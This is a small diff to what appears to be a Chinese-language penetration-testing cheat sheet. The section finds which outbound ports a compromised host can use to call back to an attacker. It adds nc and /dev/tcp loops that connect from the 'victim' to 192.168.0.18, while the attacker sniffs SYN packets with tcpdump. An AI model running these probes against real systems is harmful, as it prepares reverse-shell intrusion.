@@ -173,7 +173,10 @@ Test 可以用來反彈的port
 # Attacker
 sudo tcpdump -ni eth0 tcp[13]==2
 
-# Victim
+# Victim(with nc)
+nc -nz 192.168.0.18 1-10
+
+# Victim(without nc)
 echo > /dev/tcp/192.168.0.18/100
 for port in {200..210};do (echo > /dev/tcp/192.168.0.18/$port) 2> /dev/null;done
 ```
